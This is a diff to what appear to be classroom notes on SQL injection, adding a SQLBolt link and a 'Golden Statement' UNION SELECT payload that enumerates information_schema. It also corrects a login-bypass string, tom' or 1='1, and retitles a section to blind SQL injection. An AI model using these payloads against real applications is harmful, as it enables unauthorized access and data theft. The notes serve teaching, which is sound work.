@@ -117,7 +117,7 @@ NOTE ; terminates the command, sending it to the DB for execution.
 ```
 **PRACTICE: SQLBolt**
 
-SQLBolt.com
+[SQLBolt.com](https://sqlbolt.com/lesson/)
 
 Tutorial part of lesson, so students may gain basic experience on interacting with a SQL Database.
 
@@ -149,6 +149,10 @@ ABCDEFGHIJKLMNOPQRSTUVWXYZ
 0123456789
 @.-_+
 ```
+Golden Statement:
+`<vulnerable field>' UNION SELECT table_schema,table_name,column_name FROM information_schema.columns#`
+`<vulnerable field> UNION SELECT table_schema,table_name,column_name FROM information_schema.columns`
+
 ## DEMO: SQL Commands (SQL Demo Box).  
 
 **Truth Statements** :
@@ -185,7 +189,7 @@ to login.php -->
 On the login page enter the following in both the username and password field:
 
 ```
-tom' or 1='
+tom' or 1='1
 ```
 - Examine the **Developer Console** and find the **Request Header** under the **Network** tab
     ◦ What Type of HTTP Request was performed, and can we try a different one?
@@ -365,7 +369,7 @@ determinining what information will create a valid SQL query.
 - Database Version
 - Data within the Databases
 
-## SQL Injection Defense.  
+## Blind SQL Injection:  
 
 Occurs when an attacker sends TRUE/FALSE statements to determine how the database is
 configured.
